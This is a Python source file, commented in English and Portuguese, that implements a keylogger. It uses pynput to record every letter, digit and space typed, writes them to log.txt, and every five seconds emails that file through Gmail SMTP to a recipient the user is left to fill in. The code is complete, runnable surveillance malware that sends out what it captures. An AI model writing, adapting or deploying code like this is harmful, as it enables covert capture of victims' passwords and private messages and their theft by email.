import logging
import smtplib
import threading
import time
from email.message import EmailMessage
from pynput.keyboard import Key, Listener

file = "log.txt"
logging.basicConfig(filename=file, level=logging.DEBUG, format="%(message)s")

keys_pressed = []

# EN: Choose an on_press function. The first one saves formatted text, while the second does not.
# PT: Escolha uma função on_press. A primeira salva o texto formatado, enquanto a segunda não.
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char and (key.char.isalpha() or key.char.isdigit()):
            keys_pressed.append(key.char)
        elif key == Key.space:
            keys_pressed.append(" ")
        elif hasattr(key,"vk") and 96 <= key.vk <= 105:
            keys_pressed.append(str(key.vk - 96))
    except AttributeError:
        pass

#def on_press(key):
#    keys_pressed.append(str(key).replace("'", ""))

def write_file():
    while True:
        if keys_pressed:
            with open(file, "a") as f:
                f.write("".join(keys_pressed))
            keys_pressed.clear()
        time.sleep(1)

def send_email():
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()

    # EN: Email details.
    # PT: Detalhes do email.
    email_user = "example@gmail.com"
    email_password = "abcd efgh ijkl mnop"
    email_to = ""
    subject = ""
    body = ""
    attachment = "log.txt"

    while True:
        message = EmailMessage()
        message["Subject"] = subject
        message["From"] = email_user
        message["To"] = email_to
        message.set_content(body)

        with open(attachment, "rb") as f:
            message.add_attachment(f.read(), maintype="text", subtype="plain", filename=attachment)
        
        server.login(email_user, email_password)
        server.send_message(message)
        time.sleep(5)

threading.Thread(target=write_file, daemon=True).start()
threading.Thread(target=send_email, daemon=True).start()

with Listener(on_press=on_press) as listener:
    listener.join()